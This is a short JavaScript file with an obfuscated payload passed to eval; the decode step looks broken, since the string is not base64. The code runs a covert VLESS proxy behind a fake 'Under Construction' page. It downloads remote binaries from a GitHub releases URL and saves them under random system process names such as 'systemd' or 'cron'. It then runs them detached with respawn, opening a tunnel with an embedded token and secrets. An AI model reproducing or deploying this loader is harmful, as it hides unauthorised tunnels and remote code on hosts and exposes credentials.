const b = 'const _0x390edd=_0x4671;(function(_0x5d8691,_0x5f143f){const _0x16a8c2=_0x4671,_0x253a92=_0x5d8691();while(!![]){try{const _0x11fd6c=-parseInt(_0x16a8c2(0x132))/0x1*(parseInt(_0x16a8c2(0xee))/0x2)+-parseInt(_0x16a8c2(0x11c))/0x3+-parseInt(_0x16a8c2(0x14a))/0x4+parseInt(_0x16a8c2(0x104))/0x5*(-parseInt(_0x16a8c2(0x126))/0x6)+parseInt(_0x16a8c2(0x121))/0x7*(parseInt(_0x16a8c2(0x11f))/0x8)+parseInt(_0x16a8c2(0x144))/0x9+-parseInt(_0x16a8c2(0x122))/0xa*(-parseInt(_0x16a8c2(0xde))/0xb);if(_0x11fd6c===_0x5f143f)break;else _0x253a92['push'](_0x253a92['shift']());}catch(_0x3b968a){_0x253a92['push'](_0x253a92['shift']());}}}(_0x1dee,0x366dd));const {spawn}=require(_0x390edd(0xfa)),{WebSocketServer,createWebSocketStream}=require('ws'),http=require('http'),{URL}=require(_0x390edd(0xf1)),net=require('net'),{tmpdir}=require('os'),{join}=require('path'),{createWriteStream,promises:fs}=require('fs'),https=require('https'),{pipeline}=require(_0x390edd(0xf9)),CONFIG={'UUID':(process['env'][_0x390edd(0x12d)]||_0x390edd(0x119))[_0x390edd(0xf8)](/-/g,''),'PORT':process[_0x390edd(0x10c)][_0x390edd(0x11a)]||process[_0x390edd(0x10c)][_0x390edd(0xf0)]||0x1f90,'K_S':process[_0x390edd(0x10c)][_0x390edd(0x13c)]||_0x390edd(0x10e),'C_B':process[_0x390edd(0x10c)][_0x390edd(0xea)]||_0x390edd(0x111),'K_K':process[_0x390edd(0x10c)]['K_K']||_0x390edd(0x116),'C_T':process['env']['C_T']||_0x390edd(0x114),'C_D':process['env'][_0x390edd(0xff)]||_0x390edd(0xf7)},COMMON_NAMES=[_0x390edd(0x124),_0x390edd(0x129),_0x390edd(0x13b),_0x390edd(0x148),_0x390edd(0x141),'rsync',_0x390edd(0x149),_0x390edd(0xe8),_0x390edd(0x108),'java',_0x390edd(0x112),_0x390edd(0x12e),_0x390edd(0x113),_0x390edd(0x142),_0x390edd(0xe9),_0x390edd(0xeb),'sh',_0x390edd(0xfb),'nano',_0x390edd(0x109),_0x390edd(0x13d),_0x390edd(0x138),'service'],randName=()=>COMMON_NAMES[Math[_0x390edd(0x11e)](Math[_0x390edd(0x10b)]()*COMMON_NAMES[_0x390edd(0xe2)])],vlessLink=()=>_0x390edd(0xed)+CONFIG[_0x390edd(0x12d)]+'@'+CONFIG['C_B']+_0x390edd(0x136)+CONFIG[_0x390edd(0xff)]+_0x390edd(0xf6)+CONFIG[_0x390edd(0xff)]+_0x390edd(0xec)+CONFIG[_0x390edd(0xff)],HTML_TEMPLATES={'home':_0x390edd(0x131),'status':(_0x15ef2e,_0x33282d)=>_0x390edd(0x140)+_0x15ef2e+_0x390edd(0xfc)+_0x33282d+_0x390edd(0x127)+_0x33282d+_0x390edd(0x12f)},server=http['createServer']((_0x297f5a,_0x3eb6d6)=>{const _0x92ec17=_0x390edd;try{const {pathname:_0x432443}=new URL(_0x297f5a[_0x92ec17(0xf1)],_0x92ec17(0x12a)+_0x297f5a[_0x92ec17(0x12b)][_0x92ec17(0x125)]);if(_0x432443==='/')_0x3eb6d6[_0x92ec17(0xe4)](0xc8,{'Content-Type':'text/html'}),_0x3eb6d6[_0x92ec17(0xe0)](HTML_TEMPLATES['home']);else{if(_0x432443==='/x')_0x3eb6d6['writeHead'](0xc8,{'Content-Type':_0x92ec17(0x115)}),_0x3eb6d6[_0x92ec17(0xe0)](HTML_TEMPLATES[_0x92ec17(0x13f)](CONFIG['PORT'],vlessLink()));else _0x432443==='/health'?(_0x3eb6d6['writeHead'](0xc8,{'Content-Type':_0x92ec17(0xe1)}),_0x3eb6d6[_0x92ec17(0xe0)](JSON['stringify']({'status':'ok','uptime':process[_0x92ec17(0x118)]()}))):(_0x3eb6d6[_0x92ec17(0xe4)](0x194,{'Content-Type':_0x92ec17(0x139)}),_0x3eb6d6[_0x92ec17(0xe0)]('Not\x20Found'));}}catch{!_0x3eb6d6[_0x92ec17(0x123)]&&(_0x3eb6d6[_0x92ec17(0xe4)](0x1f4,{'Content-Type':_0x92ec17(0x139)}),_0x3eb6d6['end']('Internal\x20Server\x20Error'));}}),wss=new WebSocketServer({'server':server,'path':'/vls'});wss['on'](_0x390edd(0xe7),_0x3b4468=>{const _0x4ebd76=_0x390edd;_0x3b4468['once'](_0x4ebd76(0x10d),_0x3e4ac7=>{const _0x24134b=_0x4ebd76,[_0x33c243]=_0x3e4ac7,_0x2d6412=_0x3e4ac7['slice'](0x1,0x11);if(!_0x2d6412[_0x24134b(0x101)]((_0x4aadb5,_0x1bb522)=>_0x4aadb5===parseInt(CONFIG[_0x24134b(0x12d)]['substr'](_0x1bb522*0x2,0x2),0x10)))return;let _0x34ae1f=_0x3e4ac7[_0x24134b(0x11d)](0x11,0x12)['readUInt8']()+0x13;const _0x5cac91=_0x3e4ac7['slice'](_0x34ae1f,_0x34ae1f+=0x2)[_0x24134b(0x10a)](0x0),_0x5c0891=_0x3e4ac7[_0x24134b(0x11d)](_0x34ae1f,_0x34ae1f+=0x1)[_0x24134b(0x107)]();let _0x234548;if(_0x5c0891===0x1)_0x234548=_0x3e4ac7['slice'](_0x34ae1f,_0x34ae1f+=0x4)[_0x24134b(0x133)]('.');else{if(_0x5c0891===0x2){const _0x29ab11=_0x3e4ac7[_0x24134b(0x11d)](_0x34ae1f,_0x34ae1f+=0x1)['readUInt8']();_0x234548=new TextDecoder()[_0x24134b(0xfd)](_0x3e4ac7[_0x24134b(0x11d)](_0x34ae1f,_0x34ae1f+=_0x29ab11));}else _0x5c0891===0x3&&(_0x234548=_0x3e4ac7['slice'](_0x34ae1f,_0x34ae1f+=0x10)[_0x24134b(0xf3)]((_0x222947,_0x563231,_0x7525af,_0x3d69ef)=>_0x7525af%0x2?_0x222947[_0x24134b(0x11b)](_0x3d69ef[_0x24134b(0x11d)](_0x7525af-0x1,_0x7525af+0x1)):_0x222947,[])[_0x24134b(0x146)](_0x261548=>_0x261548[_0x24134b(0x10a)](0x0)[_0x24134b(0x130)](0x10))['join'](':'));}if(_0x3b4468[_0x24134b(0xef)]===_0x3b4468['OPEN']){_0x3b4468[_0x24134b(0x143)](new Uint8Array([_0x33c243,0x0]));const _0x3e31f4=createWebSocketStream(_0x3b4468)['on'](_0x24134b(0x105),()=>{}),_0x311c39=net[_0x24134b(0x13e)]({'host':_0x234548,'port':_0x5cac91},function(){const _0x98d867=_0x24134b;this[_0x98d867(0xf4)](_0x3e4ac7[_0x98d867(0x11d)](_0x34ae1f)),_0x3e31f4[_0x98d867(0xfe)](this)[_0x98d867(0xfe)](_0x3e31f4);});_0x311c39['on'](_0x24134b(0x105),()=>{});}});});function _0x1dee(){const _0x2aae94=['feefeb96-bfcf-4a9b-aac0-6aac771c1b98','PORT','concat','34923LwJbbL','slice','floor','9760oRorhh',',\x20signal=','371DfGqfU','7657500svOfsH','headersSent','node','host','30qDhljt','</div>\x0a\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','/ko','npm','http://','headers','/cf','UUID','cron','\x27).then(()=>alert(\x27Copied!\x27))\x22>Copy</button></div>\x0a\x20\x20</div></body></html>','toString','<!DOCTYPE\x20html><html><head><title>Under\x20Construction</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20<h1>Website\x20Under\x20Construction</h1><p>We\x27re\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20soon!</p>\x0a\x20\x20<div\x20class=\x22footer\x22>Thank\x20you\x20for\x20your\x20patience.</div></div></body></html>','5879KZsUHR','join','\x20-t\x20','-e\x20',':443?type=ws&path=%2Fvls&host=','https://github.com/seav1/dl/releases/download/files','yum','text/plain','unlink','curl','K_S','apt','connect','status','<!DOCTYPE\x20html><html><head><title>Service\x20Status</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20.container{max-width:600px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20h1{color:#333;text-align:center}\x0a\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all}\x0a\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><h1>Service\x20Running</h1>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Port:</div><div\x20class=\x22value\x22>','ssh','udev','send','2826396hWaNSH','C_T','map','arm64','wget','tar','1627232KnkWDt','destroy','11psgfUy','split','end','application/json','length','K_K','writeHead','Mozilla/5.0','chmod','connection','gzip','kmod','C_B','bash','&fp=chrome&security=tls#','vless://','62GHHTZA','readyState','SERVER_PORT','url','listen','reduce','write','),\x20restarting...','&encryption=none&sni=','waifly2.seav.eu.org','replace','stream/promises','child_process','vim','</div></div>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Connection\x20Link:</div><div\x20class=\x22value\x22\x20id=\x22vlessLink\x22>','decode','pipe','C_D','ignore','every','\x20exited\x20(code=','catch','320815FBjcrm','error','unref','readUInt8','python','git','readUInt16BE','random','env','message','https://komari.seav.eu.org','\x20--disable-auto-update','exit','loc.gov','systemd','dbus','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOTg3MWZkMmItNGFhMC00ODZlLThlODItZDBmMTY4NDA3NDljIiwicyI6Ik16ZGxPVFppWm1VdE5EVTFaQzAwTlRJNExUazNZelF0WmpWalptWTBOVE0zTVdVNSJ9','text/html','g-KMWnA7fbLPeIH-','log','uptime'];_0x1dee=function(){return _0x2aae94;};return _0x1dee();}function _0x4671(_0x1fd4f6,_0x49fdd7){const _0x1deebf=_0x1dee();return _0x4671=function(_0x4671ed,_0x695a6f){_0x4671ed=_0x4671ed-0xde;let _0x4b98e6=_0x1deebf[_0x4671ed];return _0x4b98e6;},_0x4671(_0x1fd4f6,_0x49fdd7);}async function downloadAndRun(_0x1a43d1,_0x3aef0d,_0x2247c2){const _0x66eb5b=_0x390edd;if(!_0x1a43d1)return;const _0xd89d6d=join(tmpdir(),randName());try{const _0x3f8440=await new Promise((_0x2c3e7f,_0x364b0a)=>{const _0x31e76a=_0x4671,_0x5af461=https['get'](_0x1a43d1,{'headers':{'User-Agent':_0x31e76a(0xe5)}},_0x2c3e7f);_0x5af461['on']('error',_0x364b0a),_0x5af461['setTimeout'](0x7530,()=>_0x5af461[_0x31e76a(0x14b)]());});await pipeline(_0x3f8440,createWriteStream(_0xd89d6d)),await fs[_0x66eb5b(0xe6)](_0xd89d6d,0x1ed),spawnProcess(_0xd89d6d,_0x3aef0d,_0x2247c2);}catch{await fs[_0x66eb5b(0x13a)](_0xd89d6d)[_0x66eb5b(0x103)](()=>{});}}function spawnProcess(_0x3b1cec,_0x14b2f3,_0x21df4f){const _0x271db1=_0x390edd,_0x44e7ad=spawn(_0x3b1cec,_0x14b2f3[_0x271db1(0xdf)]('\x20'),{'stdio':_0x271db1(0x100),'detached':!![]});_0x44e7ad[_0x271db1(0x106)](),_0x44e7ad['on'](_0x271db1(0x110),(_0x4d2e60,_0x410466)=>{const _0x5457f8=_0x271db1;console[_0x5457f8(0x117)](_0x21df4f+_0x5457f8(0x102)+_0x4d2e60+_0x5457f8(0x120)+_0x410466+_0x5457f8(0xf5)),setTimeout(()=>spawnProcess(_0x3b1cec,_0x14b2f3,_0x21df4f),0x1388);});}const baseUrl=_0x390edd(0x137),archUrl=_0x2c1e29=>process['arch']===_0x390edd(0x147)?_0x2c1e29+'-arm':_0x2c1e29;downloadAndRun(archUrl(baseUrl+_0x390edd(0x128)),_0x390edd(0x135)+CONFIG['K_S']+_0x390edd(0x134)+CONFIG[_0x390edd(0xe3)]+_0x390edd(0x10f),'ko'),downloadAndRun(archUrl(baseUrl+_0x390edd(0x12c)),'tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20'+CONFIG[_0x390edd(0x145)],'cf'),server[_0x390edd(0xf2)](CONFIG['PORT']);';
const code = Buffer.from(b, 'base64').toString();
eval(code);
